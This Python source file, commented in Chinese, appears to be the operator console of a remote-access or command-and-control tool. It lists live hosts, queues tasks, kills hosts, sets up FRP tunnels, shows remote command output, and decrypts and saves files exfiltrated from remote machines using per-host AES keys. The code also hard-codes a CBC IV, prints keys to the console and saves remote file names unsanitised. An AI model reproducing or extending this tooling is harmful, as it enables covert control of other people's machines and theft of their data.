from lib.basecli import *
import time
import sys
import os
from Crypto.Cipher import AES
from base64 import b64decode


print("[DEBUG] 程序开始执行")

def getrst(basefun):
    print("[DEBUG] 启动结果监听")
    last_debug_time = 0
    debug_interval = 100  # 每10秒才显示一次debug信息
    
    while True:
        try:
            current_time = time.time()
            data = post(url=basefun.get_rst, data={"pwd":basefun.pwd}, timeout=5, verify=False)
            
            # 限制调试信息输出频率
            if current_time - last_debug_time > debug_interval:
                print("[DEBUG] 正在监听结果...")
                last_debug_time = current_time
                
            if data.status_code == 200:
                data = loads(data.text)
                if data:  # 只有当有实际数据时才输出
                    print("\n[DEBUG] 收到新的结果数据")
                    for key, i in data.items():
                        if isinstance(i, dict):
                            rst = i.get("data")
                            if rst and rst.get("cdm") == "download_file":
                                try:
                                    print("[DEBUG] 检测到文件下载数据")
                                    file_data = rst.get("file_data")
                                    if file_data:
                                        print(f"[DEBUG] 文件数据长度: {len(file_data)}")
                                        
                                        host_key = i.get("key")
                                        aes_key = basefun.host_keys.get(host_key)
                                        if not aes_key:
                                            print(f"[ERROR] 未找到密钥: {host_key}")
                                            continue
                                            
                                        print(f"[DEBUG] 使用密钥: {aes_key}")
                                        
                                        try:
                                            decrypted_data = FileCrypto.decrypt(file_data, aes_key)
                                            print(f"[DEBUG] 解密成功，数据长度: {len(decrypted_data)}")
                                            
                                            # 创建 downfile 目录（如果不存在）
                                            if not exists("./downfile"):
                                                from os import makedirs
                                                makedirs("./downfile")
                                            
                                            timestamp = time.strftime('%Y%m%d_%H%M%S')
                                            filename = rst.get('original_filename', f"downloaded_{timestamp}.txt")
                                            filepath = f"./downfile/{filename}"
                                            
                                            with open(filepath, "wb") as f:
                                                f.write(decrypted_data)
                                            print(f"\n[+] 文件下载完成！保存为: {filepath}")
                                            
                                        except Exception as e:
                                            print(f"[ERROR] 文件解密失败: {e}")
                                            continue
                                    else:
                                        print("[ERROR] 没有收到文件数据")
                                except Exception as e:
                                    print(f"\n[ERROR] 文件下载处理错误: {e}")
                                    import traceback
                                    traceback.print_exc()
                            elif rst and rst.get("cdm") == "upload_file":
                                try:
                                    print("[DEBUG] 检测到文件上传数据")
                                    file_data = rst.get("file_data")
                                    target_path = rst.get("target_path")
                                    
                                    if file_data and target_path:
                                        print(f"[DEBUG] 文件数据长度: {len(file_data)}")
                                        
                                        host_key = i.get("key")
                                        aes_key = basefun.host_keys.get(host_key)
                                        if not aes_key:
                                            print(f"[ERROR] 未找到密钥: {host_key}")
                                            continue
                                            
                                        print(f"[DEBUG] 使用密钥: {aes_key}")
                                        
                                        try:
                                            # Base64解码
                                            encrypted_data = b64decode(file_data)
                                            print(f"[DEBUG] Base64解码后数据长度: {len(encrypted_data)}")
                                            
                                            # 解密数据
                                            decrypted_data = FileCrypto.decrypt(encrypted_data, aes_key)
                                            print(f"[DEBUG] 解密后数据长度: {len(decrypted_data)}")
                                            
                                            # 确保目标目录存在
                                            target_dir = os.path.dirname(target_path)
                                            if target_dir:
                                                os.makedirs(target_dir, exist_ok=True)
                                            
                                            # 写入文件
                                            with open(target_path, "wb") as f:
                                                f.write(decrypted_data)
                                            print(f"\n[+] 文件上传完成！保存为: {target_path}")
                                            
                                        except Exception as e:
                                            print(f"[ERROR] 文件处理失败: {e}")
                                            continue
                                    else:
                                        print("SUCCESS")
                                except Exception as e:
                                    print(f"\n[ERROR] 文件上传处理错误: {e}")
                                    import traceback
                                    traceback.print_exc()
                            # 添加对普通命令结果的处理
                            elif rst:  # 处理普通命令结果
                                if "data" in rst:
                                    print(f"\n[+] 命令执行结果:\n{rst['data']}")
                                    
                        elif isinstance(i, str):
                            print(f"\n[INFO] {i}")
            
            sleep(2)  # 降低轮询频率
            
        except Exception as e:
            if current_time - last_debug_time > debug_interval:
                print(f"[ERROR] 结果处理错误: {e}")
                last_debug_time = current_time
            sleep(2)
            continue

def handle_file_download(rst, aes_key):
    try:
        print("[DEBUG] 处理文件下载")

        
        file_data = rst.get('file_data')
        if not file_data:
            print("[ERROR] 没有找到文件数据")
            return False
            
        print(f"[DEBUG] Base64编码的文件数据长度: {len(file_data)}")
        print(f"[DEBUG] Base64编码的数据: {file_data[:50]}...")  # 打印前50个字符
        
        # 修正Base64填充
        padding_needed = len(file_data) % 4
        if padding_needed:
            file_data += '=' * (4 - padding_needed)
            print(f"[DEBUG] 添加填充后的Base64数据长度: {len(file_data)}")
        
        try:
            # 解码 Base64
            encrypted_data = b64decode(file_data)
            print(f"[DEBUG] Base64解码后数据长度: {len(encrypted_data)}")
            
            # 确保数据长度是16的倍数
            if len(encrypted_data) % 16 != 0:
                print(f"[ERROR] 数据长度 {len(encrypted_data)} 不是16的倍数")
                return False
            
            # 解密数据
            cipher = AES.new(aes_key[:16].encode('utf-8'), AES.MODE_CBC, b'1234567890abcdef')
            decrypted_padded = cipher.decrypt(encrypted_data)
            print(f"[DEBUG] 解密后填充数据长度: {len(decrypted_padded)}")
            
            # 移除填充
            padding_length = decrypted_padded[-1]
            decrypted_data = decrypted_padded[:-padding_length]
            print(f"[DEBUG] 移除填充后数据长度: {len(decrypted_data)}")
            
            # 确保下载目录存在
            if not os.path.exists("./downfile"):
                os.makedirs("./downfile")
            
            # 保存文件
            filename = rst.get('original_filename', f"downloaded_{int(time.time())}.txt")
            filepath = f"./downfile/{filename}"
            
            with open(filepath, "wb") as f:
                f.write(decrypted_data)
            print(f"\n[+] 文件下载完成！保存为: {filepath}")
            
            return True
            
        except Exception as e:
            print(f"[ERROR] 文件数据处理错误: {e}")
            import traceback
            traceback.print_exc()
            return False
            
    except Exception as e:
        print(f"[ERROR] 文件下载处理错误: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    print("[DEBUG] main 函数开始执行")
    try:
        custom_endpoints = {
            "add_task": "/api/addtask",
            "get_result": "/api/getrst",
            "get_hosts": "/api/getlive",
            "kill_host": "/api/killhost",
            "frp_server": "/api/frpserver",
            "get_keys": "/api/getlivekeys"
        }
        
        print("[DEBUG] 初始化 BaseFunc")
        handle = BaseFunc()
        
        print("[DEBUG] 获取在线主机信息")
        handle.get_online_host()
        
        print("[DEBUG] 启动结果监听线程")
        Thread(target=getrst, args=(handle,), daemon=True).start()  # 设置为守护线程
        
        print("\n[+] 系统初始化完成!")
        print("[*] 输入 'help' 获取帮助信息")
        print("[*] 输入 'getlive' 获取在线主机")
        
        # 清空输入缓冲
        sys.stdout.flush()
        
        while True:
            try:
                opt = input("\n>>> ")
                sys.stdout.flush()  # 确保提示符显示
                if opt:
                    handle.opt_deal(opt)
                sleep(0.1)
            except KeyboardInterrupt:
                print("\n[!] 正在退出程序...")
                sys.exit(0)
            except Exception as e:
                print(f"[ERROR] 命令处理错误: {e}")
                
    except Exception as e:
        print(f"[ERROR] 主函数发生错误: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(-1)

if __name__ == "__main__":
    print("[DEBUG] 程序入口点执行")
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户中断，程序退出")
        sys.exit(0)


